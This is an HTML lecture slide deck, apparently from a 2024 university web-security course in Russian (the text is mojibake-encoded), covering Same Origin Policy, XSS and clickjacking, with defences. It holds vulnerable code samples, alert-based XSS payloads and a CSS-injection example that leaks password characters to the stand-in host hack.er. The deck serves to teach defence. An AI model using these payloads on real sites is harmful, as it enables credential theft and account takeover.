<!DOCTYPE html>
<html lang="ru">
<head>
	<title>–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å web-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π, –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ web-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∞ API</title>
	<meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<link rel="icon" type="image/png" href="/lib/favicon.png"/>
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<link rel="stylesheet" href="/lib/shower/themes/technopark/styles/screen-4x3.css">
	<link rel="stylesheet" href="/lib/slides.css">

</head>
<body class="shower list">

<header class="caption">
	<h1>–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å web-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π, –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ web-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∞ API</h1>
	<p>–¢–µ—Ö–Ω–æ–ø–∞—Ä–∫, –æ—Å–µ–Ω—å, 2024 –≥.</p>
</header>

<section class="slide first">
	<h2 class="shout">–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å web-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π<br/>
		<small>–°–ª–∞–π–¥—ã –¥–æ—Å—Ç—É–ø–Ω—ã –ø–æ —Å—Å—ã–ª–∫–µ<br/>
			<a href="https://frontend.tech-mail.ru/">frontend.tech-mail.ru</a>
		</small>
	</h2>
</section>

<section class="slide">
	<h2>–í–∏–¥—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏:</h2>
	<ul>
		<li>–ø—Ä–æ–¥—É–∫—Ç–æ–≤–∞—è üíª</li>
		<li>–∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–Ω–∞—è üåê</li>
		<li>complience üíÅüèª</li>
		<li>—Ñ–∏–∑–∏—á–µ—Å–∫–∞—è ü•∑üèª</li>
		<li>–Ω–æ—Ä–º–∞—Ç–∏–≤–Ω–∞—è üßë‚Äç‚öñÔ∏è</li>
	</ul>
</section>

<section class="slide">
	<h2>Same Origin Policy</h2>
	<blockquote>
		<p class="medium-content"><b>–ü—Ä–∞–≤–∏–ª–æ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è –¥–æ–º–µ–Ω–∞ (Same Origin Policy &mdash; ¬´–ü—Ä–∏–Ω—Ü–∏–ø –æ–¥–∏–Ω–∞–∫–æ–≤–æ–≥–æ
			–∏—Å—Ç–æ—á–Ω–∏–∫–∞¬ª a.k.a. ¬´–ü–æ–ª–∏—Ç–∏–∫–∞ –µ–¥–∏–Ω–æ–≥–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞¬ª)</b> &mdash; —ç—Ç–æ –≤–∞–∂–Ω–∞—è –∫–æ–Ω—Ü–µ–ø—Ü–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ —Ä–∞–±–æ—Ç—ã web-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π. –û–Ω–∞ –ø—Ä–∏–∑–≤–∞–Ω–∞
			<mark>–æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏</mark> –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤ –∏–∑ –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω–æ–≥–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞ –ø–æ –¥–æ—Å—Ç—É–ø—É –∫ —Ä–µ—Å—É—Ä—Å–∞–º –∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∏–∑ –¥—Ä—É–≥–∏—Ö
			–∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤</p>
	</blockquote>
	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank">–ü–æ–¥—Ä–æ–±–Ω–µ–µ</a></p>
</section>

<section class="slide">
	<h2>Same Origin Policy</h2>
	<p>–í–≤–æ–¥–∏—Ç—Å—è –ø–æ–Ω—è—Ç–∏–µ
		<mark>–∏—Å—Ç–æ—á–Ω–∏–∫–∞</mark>
		(–∞–¥—Ä–µ—Å –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ, –æ—Ç–∫—É–¥–∞ –±—ã–ª –∑–∞–≥—Ä—É–∂–µ–Ω&nbsp;—Ä–µ—Å—É—Ä—Å). –î–≤–∞ URL —Å—á–∏—Ç–∞—é—Ç—Å—è –∏–º–µ—é—â–∏–º –æ–¥–∏–Ω –∏—Å—Ç–æ—á–Ω–∏–∫ (¬´same origin¬ª), –µ—Å–ª–∏ —É
		–Ω–∏—Ö
		<mark>–æ–¥–∏–Ω–∞–∫–æ–≤—ã–π –ø—Ä–æ—Ç–æ–∫–æ–ª, –¥–æ–º–µ–Ω –∏ –ø–æ—Ä—Ç</mark>
	</p>
	<p>–£ —ç—Ç–∏—Ö —Ä–µ—Å—É—Ä—Å–æ–≤ –æ–¥–∏–Ω–∞–∫–æ–≤—ã–µ –∏—Å—Ç–æ—á–Ω–∏–∫–∏:</p>
	<ul>
		<li><code>http://site.com</code></li>
		<li><code>http://site.com/</code></li>
		<li><code>http://site.com/my/page.html</code></li>
	</ul>
</section>

<section class="slide">
	<h2>Same Origin Policy</h2>
	<p>–£ —ç—Ç–∏—Ö —Ä–µ—Å—É—Ä—Å–æ–≤ <strong>—Ä–∞–∑–Ω—ã–µ</strong> –∏—Å—Ç–æ—á–Ω–∏–∫–∏:</p>
	<ul>
		<li><code>http://site.com</code></li>
		<li><code>http://<strong>www</strong>.site.com</code> (–¥—Ä—É–≥–æ–π –¥–æ–º–µ–Ω)</li>
		<li><code>http://site.<strong>org</strong></code> (–¥—Ä—É–≥–æ–π –¥–æ–º–µ–Ω)</li>
		<li><code><strong>https</strong>://site.com</code> (–¥—Ä—É–≥–æ–π –ø—Ä–æ—Ç–æ–∫–æ–ª)</li>
		<li><code>http://site.com:<strong>8080</strong></code> (–¥—Ä—É–≥–æ–π –ø–æ—Ä—Ç)</li>
	</ul>
</section>

<section class="slide">
	<h2>–¢–∏–ø—ã –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å —Ä–µ—Å—É—Ä—Å–∞–º–∏</h2>
	<p>–õ—é–±–æ–π —Å–ø–æ—Å–æ–± –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å —Ä–µ—Å—É—Ä—Å–∞–º–∏ –≤ web-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö –º–æ–∂–Ω–æ –æ—Ç–Ω–µ—Å—Ç–∏ –∫ –æ–¥–Ω–æ–π –∏–∑ —Ç—Ä—ë—Ö –∫–∞—Ç–µ–≥–æ—Ä–∏–π:</p>
	<ul>
		<li><mark><strong>"–ó–∞–ø–∏—Å—å" –≤ —Ä–µ—Å—É—Ä—Å—ã</strong></mark> &mdash; –Ω–∞–ø—Ä–∏–º–µ—Ä: –ø–µ—Ä–µ—Ö–æ–¥—ã –ø–æ —Å—Å—ã–ª–∫–∞–º, —Ä–µ–¥–∏—Ä–µ–∫—Ç—ã, —Å–∞–±–º–∏—Ç —Ñ–æ—Ä–º, –æ—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–æ–≤</li>
		<li><mark><strong>"–í—Å—Ç—Ä–∞–∏–≤–∞–Ω–∏–µ" —Ä–µ—Å—É—Ä—Å–æ–≤ –≤ –¥—Ä—É–≥–∏–µ —Ä–µ—Å—É—Ä—Å—ã</strong></mark>:
			<ul>
				<li>JavaScript with <code>&lt;script src="...">&lt;/script></code></li>
				<li>CSS with <code>&lt;link rel="stylesheet" href="..."></code></li>
				<li>Images with <code>&lt;img></code>, media files with <code>&lt;video></code> and <code>&lt;audio></code></li>
				<li>Plug-ins with <code>&lt;object></code>, <code>&lt;embed></code> and <code>&lt;applet></code></li>
			</ul>
		</li>
		<li><mark><strong>"–ß—Ç–µ–Ω–∏–µ" –∏–∑ –¥—Ä—É–≥–∏—Ö —Ä–µ—Å—É—Ä—Å–æ–≤</strong></mark> &mdash; –Ω–∞–ø—Ä–∏–º–µ—Ä: —á—Ç–µ–Ω–∏–µ –æ—Ç–≤–µ—Ç–æ–≤ –Ω–∞ –∑–∞–ø—Ä–æ—Å—ã, –ø–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–æ–¥–µ—Ä–∂–∏–º–æ–º—É –≤—Å—Ç—Ä–æ–µ–Ω–Ω–æ–≥–æ —Ä–µ—Å—É—Ä—Å–∞...</li>
	</ul>
</section>

<section class="slide">
	<h2>Same Origin Policy</h2>
	<p class="small-content"></p>
	<ul>
		<li>Cross Origin "–ó–∞–ø–∏—Å—å" –≤ —Ä–µ—Å—É—Ä—Å—ã –æ–±—ã—á–Ω–æ —Ä–∞–∑—Ä–µ—à–∞–µ—Ç—Å—è (<em>–∑–∞ –Ω–µ–∫–æ—Ç–æ—Ä—ã–º–∏ –∏—Å–∫–ª—é—á–µ–Ω–∏—è–º–∏, –æ –Ω–∏—Ö —á—É—Ç—å –ø–æ–∑–∂–µ</em>)</li>
		<li>Cross Origin "–í—Å—Ç—Ä–∞–∏–≤–∞–Ω–∏–µ" —Ä–µ—Å—É—Ä—Å–æ–≤ –æ–±—ã—á–Ω–æ —Ä–∞–∑—Ä–µ—à–∞–µ—Ç—Å—è</li>
		<li>Cross Origin "–ß—Ç–µ–Ω–∏–µ" –∏–∑ –¥—Ä—É–≥–∏—Ö —Ä–µ—Å—É—Ä—Å–æ–≤ –ø–æ-—É–º–æ–ª—á–∞–Ω–∏—é –∑–∞–ø—Ä–µ—â–µ–Ω–æ</li>
	</ul>
</section>

<section class="slide question">
	<h2>
		<span style="font-size: 85%">–°–ø–æ—Å–æ–±—ã –æ–±—Ö–æ–¥–∞ Same Origin Policy</span>
	</h2>
</section>

<section class="slide question">
	<h2>
		<span style="font-size: 85%">Cross-Site Scripting (XSS)</span>
	</h2>
</section>

<section class="slide">
	<h2>Cross-Site Scripting (XSS)</h2>
	<blockquote>
		<p class="medium-content"><b>Cross-Site Scripting</b> &mdash; –∞—Ç–∞–∫–∞, –∑–∞–∫–ª—é—á–∞—é—â–∞—è—Å—è –≤–æ <mark>–≤–Ω–µ–¥—Ä–µ–Ω–∏–∏ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞</mark>, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –∏—Å—Ç–æ—á–Ω–∏–∫–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —Å–∞–π—Ç–∞ —Å —Ü–µ–ª—å—é –æ–±—Ö–æ–¥–∞ –ø–æ–ª–∏—Ç–∏–∫ –µ–¥–∏–Ω–æ–≥–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞, –∏ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–∏ —ç—Ç–æ–≥–æ –∫–æ–¥–∞ —Å –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–æ–º –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞</p>
	</blockquote>
	<p class="note">–° –ø–æ–º–æ—â—å—é XSS –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç <strong>—É–∫—Ä–∞—Å—Ç—å –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è sensitive-–¥–∞–Ω–Ω—ã–µ</strong> (–Ω–∞–ø—Ä–∏–º–µ—Ä, cookies —Å ID —Å–µ—Å—Å–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –ø—Ä–∏–≤–∞—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–ª–∏ –¥–∞–Ω–Ω—ã–µ –∏–∑ —Ñ–æ—Ä–º), –º–æ–∂–µ—Ç <strong>–≤—ã–ø–æ–ª–Ω–∏—Ç—å –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Ä–∞–∑–ª–∏—á–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è</strong> –∏–ª–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä, <strong>–ø—Ä–æ–≤–µ—Å—Ç–∏ DDOS-–∞—Ç–∞–∫—É</strong></p>
</section>

<section class="slide">
	<h2>–ü—Ä–∏–º–µ—Ä —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<pre class="hljs php">
		<code>&lt;?php</code>
		<code>    $name = $_REQUEST ['name'];</code>
		<code>?></code>
		<code class="hljs html">&lt;html></code>
		<code class="hljs html">    &lt;head>&lt;title>–ü–æ—Ä—Ç–∞–ª –¢–µ—Ö–Ω–æ–ø–∞—Ä–∫–∞&lt;/title>&lt;/head></code>
		<code class="hljs html">    &lt;body></code>
		<code>        Hello, &lt;?php echo $name; ?>!</code>
		<code class="hljs html">    &lt;/body></code>
		<code class="hljs html">&lt;/html></code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<p class="small-content"></p>
	<pre class="hljs js">
		<code>const html = '&lt;script>alert("XSS")&lt;/script>';</code>
		<code>const link =</code>
		<code>    'https://park.mail.ru/?name=' + encodeURIComponent(html);</code>
		<code> </code>
		<code>console.log(link);</code>
		<code>// https://park.mail.ru/?name=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ü—Ä–∏–º–µ—Ä —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<p class="small-content"></p>
	<pre class="hljs js">
		<code>const response = http.get('/message');</code>
		<code>const messageText = response.content;</code>
		<code> </code>
		<code>const chat = document.getElementById('chat');</code>
		<code>chat.innerHTML += messageText;</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>// —Ç–∞–∫ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç</code>
		<code>chat.innerHTML += `</code>
		<code class="hljs html">    &lt;/div>&lt;script>alert("XSS")&lt;/script></code>
		<code>`;</code>
		<code> </code>
	</pre>
	<pre class="hljs js next">
		<code>// –∞ –≤–æ—Ç —Ç–∞–∫ - –ø–æ–ª—É—á–∏—Ç—Å—è</code>
		<code>chat.innerHTML += `</code>
		<code class="hljs html">    &lt;/div>&lt;img src="/404.png" onerror="alert('XSS')"></code>
		<code>`;</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ü—Ä–∏–º–µ—Ä —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<p class="small-content"></p>
	<pre class="hljs js">
		<code>// –¥–µ–ª–∞–µ–º —Å–∞–π—Ç —Å oauth-–∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–µ–π</code>
		<code>const backRedirectUrl =</code>
		<code>    new URLSearchParams(window.location.search).get('back');</code>
		<code> </code>
		<code>const link = document.createElement('a');</code>
		<code>link.textContent = 'Click Me!';</code>
		<code>link.href = backRedirectUrl;</code>
		<code>document.appendChild(link);</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>// –Ω–∞—Ö–æ–¥–∏–º—Å—è –Ω–∞</code>
		<code>// https://park.mail.ru/?back=javascript%3Aalert%28%27XSS%27%29%3B</code>
		<code>const backRedirectUrl = // "javascript:alert('XSS');"</code>
		<code>    new URLSearchParams(window.location.search).get('back');</code>
		<code> </code>
		<code>const link = document.createElement('a');</code>
		<code>link.href = backRedirectUrl;</code>
		<code> </code>
		<code class="hljs html">// &lt;a href="javascript:alert('XSS');">Click Me!&lt;a></code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ü—Ä–∏–º–µ—Ä —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>const avatarUrl = http.get('/me').avatarUrl;</code>
		<code> </code>
		<code>const styleContent = `</code>
		<code>    <span hidden>`</span>#avatar {<span hidden>`</span></code>
		<code>    <span hidden>`</span>    background: url(${avatarUrl});<span hidden>`</span></code>
		<code>    <span hidden>`</span>}<span hidden>`</span></code>
		<code>`;</code>
		<code> </code>
		<code>const style = document.createElement('style');</code>
		<code>style.textContent = styleContent;</code>
		<code>document.appendChild(style);</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>const avatarUrl = http.get('/me').avatarUrl;</code>
		<code class="hljs js">console.log(avatarUrl); -> `);}<span hidden>`</span></code>
		<code class="hljs css">[type=password][value^='a'] { background-image: url(https://hack.er/a); }</code>
		<code class="hljs css">[type=password][value^='b'] { background-image: url(https://hack.er/b); }</code>
		<code class="hljs css">[type=password][value^='c'] { background-image: url(https://hack.er/c); }</code>
		<code class="hljs css">[type=password][value^='d'] { background-image: url(https://hack.er/d); }</code>
		<code class="hljs css">[type=password][value^='e'] { background-image: url(https://hack.er/e); }</code>
		<code class="hljs js"><span hidden>`</span>abc { background: url(`</code>
		<code class="hljs css"> </code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<p class="medium-content"></p>
	<pre class="hljs css">
		<code>#avatar {</code>
		<code class="hljs css">    background: url();}</code>
		<code class="hljs css">[type=password][value^='a'] { background-image: url(https://hack.er/a); }</code>
		<code class="hljs css">[type=password][value^='b'] { background-image: url(https://hack.er/b); }</code>
		<code class="hljs css">[type=password][value^='c'] { background-image: url(https://hack.er/c); }</code>
		<code class="hljs css">[type=password][value^='d'] { background-image: url(https://hack.er/d); }</code>
		<code class="hljs css">[type=password][value^='e'] { background-image: url(https://hack.er/e); }</code>
		<code class="hljs css">div { background: url();</code>
		<code class="hljs css">}</code>
		<code class="hljs css"> </code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</h2>
	<p class="medium-content"></p>
	<pre class="hljs css">
		<code>#avatar {</code>
		<code class="hljs css">    background: url(<mark>);}</mark></code>
		<code class="hljs css"><mark>[type=password][value^='a'] { background-image: url(https://hack.er/a); }</mark></code>
		<code class="hljs css"><mark>[type=password][value^='b'] { background-image: url(https://hack.er/b); }</mark></code>
		<code class="hljs css"><mark>[type=password][value^='c'] { background-image: url(https://hack.er/c); }</mark></code>
		<code class="hljs css"><mark>[type=password][value^='d'] { background-image: url(https://hack.er/d); }</mark></code>
		<code class="hljs css"><mark>[type=password][value^='e'] { background-image: url(https://hack.er/e); }</mark></code>
		<code class="hljs css"><mark>div { background: url(</mark>);</code>
		<code class="hljs css">}</code>
		<code class="hljs css"> </code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>–°–ø–æ—Å–æ–±—ã –∑–∞—â–∏—Ç—ã –æ—Ç XSS</h2>
	<p class="medium-content"></p>
	<ul>
		<li>–¢—â–∞—Ç–µ–ª—å–Ω–∞—è —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è –∏ —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç–∞, –≤—Å—Ç–∞–≤–ª—è–µ–º–æ–≥–æ –Ω–∞–ø—Ä—è–º—É—é —á–µ—Ä–µ–∑ <code>DOM API</code></li>
		<li>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –±–µ–ª—ã—Ö —Å–ø–∏—Å–∫–æ–≤ –ø—Ä–∏ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ HTML</li>
		<li>–ü—Ä–∞–≤–∏–ª—å–Ω–∞—è —Ä–∞–±–æ—Ç–∞ —Å –∫—É–∫–∞–º–∏, –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ <code>httpOnly</code></li>
		<li>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ–≥–æ –∑–∞–≥–æ–ª–æ–≤–∫–∞ <code>X-XSS-Protection</code></li>
		<li>–ï—â—ë –±–æ–ª—å—à–µ –ø—Ä–æ XSS <a href="https://habrahabr.ru/company/pt/blog/149152/" target="_blank">—Ç—É—Ç</a> –∏ <a href="https://habrahabr.ru/company/xakep/blog/189210/" target="_blank">—Ç—É—Ç</a></li>
	</ul>
</section>

<section class="slide question">
	<h2>
		<span style="font-size: 85%">Clickjacking (—É–≥–æ–Ω&nbsp;–∫–ª–∏–∫–æ–≤)</span>
	</h2>
</section>

<section class="slide">
	<h2>–≠–ª–µ–º–µ–Ω—Ç <code>&lt;iframe></code></h2>
	<blockquote>
		<p class="medium-content">–≠–ª–µ–º–µ–Ω—Ç <code>&lt;iframe></code> —Å–æ–∑–¥–∞—ë—Ç —Ñ—Ä–µ–π–º &mdash; –æ–±–ª–∞—Å—Ç—å –∑–∞–¥–∞–Ω–Ω—ã—Ö —Ä–∞–∑–º–µ—Ä–æ–≤,
			–∫–æ—Ç–æ—Ä–∞—è –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤–Ω—É—Ç—Ä–∏ –æ–±—ã—á–Ω–æ–≥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞, –≤ –∫–æ—Ç–æ—Ä—É—é –º–æ–∂–Ω–æ –∑–∞–≥—Ä—É–∂–∞—Ç—å –ª—é–±—ã–µ –¥—Ä—É–≥–∏–µ –Ω–µ–∑–∞–≤–∏—Å–∏–º—ã–µ –¥–æ–∫—É–º–µ–Ω—Ç—ã
		</p>
	</blockquote>
</section>

<section class="slide">
	<h2>–≠–ª–µ–º–µ–Ω—Ç <code>&lt;iframe></code></h2>
	<code>&lt;iframe src="https://example.com/" width="900" height="500"></code>

	<iframe src="https://www.example.com/" frameborder="0" id="frameMy" width="900" height="510"></iframe>
</section>

<section class="slide">
	<h2>–ê—Ç–∞–∫–∞ Clickjacking (—É–≥–æ–Ω –∫–ª–∏–∫–æ–≤)</h2>
	<blockquote>
		<p class="medium-content"><b>–ê—Ç–∞–∫–∞ Clickjacking</b> &mdash; –º–µ—Ö–∞–Ω–∏–∑–º –æ–±–º–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–º –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∏–ª–∏ –¥–∞–∂–µ –∑–∞—Å—Ç–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤—ã–ø–æ–ª–Ω–∏—Ç—å –æ–ø—Ä–µ–¥–µ–ª—ë–Ω–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è, –∑–∞–º–∞–Ω–∏–≤ –µ–≥–æ –Ω–∞ –≤–Ω–µ—à–Ω–µ –±–µ–∑–æ–±–∏–¥–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É –∏–ª–∏ –≤–Ω–µ–¥—Ä–∏–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É</p>
	</blockquote>
</section>

<section class="slide">
	<h2>–ê—Ç–∞–∫–∞ Clickjacking (—É–≥–æ–Ω –∫–ª–∏–∫–æ–≤)</h2>
	<p class="medium-content"></p>
	<ol>
		<li>–ó–∞–º–∞–Ω–∏–≤–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ –Ω–∞—à—É —Å—Ç—Ä–∞–Ω–∏—Ü—É</li>
		<li>–û—Ç–∫—Ä—ã–≤–∞–µ–º –Ω–∞ –Ω–∞—à–µ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ <mark>iframe —Å facebook'–æ–º</mark>, –¥–µ–ª–∞–µ–º –µ–º—É <code>opacity:&nbsp;0;</code> –∏ –ø–æ–∑–∏—Ü–∏–æ–Ω–∏—Ä—É–µ–º –ø–æ–¥ –∫—É—Ä—Å–æ—Ä–æ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</li>
		<li>–°–º–µ—â–∞–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ iframe —Ç–∞–∫, —á—Ç–æ–±—ã –≤ –æ–∫–Ω–µ –æ–∫–∞–∑–∞–ª–∞—Å—å –∫–Ω–æ–ø–∫–∞ –ø–æ–¥–ø–∏—Å–∫–∏ –Ω–∞ —Å–æ–æ–±—â–µ—Å—Ç–≤–æ</li>
		<li>–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –¥–µ–ª–∞–µ—Ç –∫–ª–∏–∫</li>
		<li>???????</li>
		<li>PROFIT!</li>
	</ol>
</section>

<section class="slide">
	<h2>–ó–∞—â–∏—Ç–∞ –æ—Ç Clickjacking</h2>
	<p>–ò—Å–ø–æ–ª—å–∑—É–µ–º –∑–∞–≥–æ–ª–æ–≤–æ–∫ <code>X-Frame-Options</code>:</p>
	<ul>
		<li><code>X-Frame-Options: DENY</code> &mdash; –∑–∞–ø—Ä–µ—â–∞–µ—Ç –æ—Ç–∫—Ä—ã–≤–∞—Ç—å —Å–∞–π—Ç –≤–Ω—É—Ç—Ä–∏ iframe</li>
		<li><code>X-Frame-Options: SAMEORIGIN</code> &mdash; —Ä–∞–∑—Ä–µ—à–∞–µ—Ç –æ—Ç–∫—Ä—ã–≤–∞—Ç—å —Å–∞–π—Ç –≤–Ω—É—Ç—Ä–∏ iframe –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–∞—Ö —Å —Ç–µ–º –∂–µ —Å–∞–º—ã–º origin</li>
		<li><code>X-Frame-Options: ALLOW-FROM https://example.com/</code> &mdash; —Ä–∞–∑—Ä–µ—à–∞–µ—Ç –æ—Ç–∫—Ä—ã–≤–∞—Ç—å —Å–∞–π—Ç –≤–Ω—É—Ç—Ä–∏ iframe –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–∞—Ö —Å —É–∫–∞–∑–∞–Ω–Ω—ã–º origin</li>
	</ul>
</section>

<section class="slide">
	<h2>–ö–∞–∫–∞—è –µ—â—ë –µ—Å—Ç—å —É–≥—Ä–æ–∑–∞ <br>—Å–≤—è–∑–∞–Ω–Ω–∞—è —Å <strong>iframe</strong>?</h2>
	<p>–£ —ç–ª–µ–º–µ–Ω—Ç–∞ <code>iframe</code> –µ—Å—Ç—å —Å–≤–æ–π—Å—Ç–≤–∞, –ø–æ–∑–≤–æ–ª—è—é—â–∏–µ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã:</p>
	<ul>
		<li><code>iframe.contentWindow</code> &mdash; —Å—Å—ã–ª–∫–∞ –Ω–∞ <code>window</code> —Å—Ç—Ä–∞–Ω–∏—Ü—ã,<br>–∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–π –≤ <code>iframe</code></li>
		<li><code>iframe.contentWindow.document</code> &mdash; —Å—Å—ã–ª–∫–∞ –Ω–∞ <code>document</code> —Å—Ç—Ä–∞–Ω–∏—Ü—ã, –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–π –≤ <code>iframe</code></li>
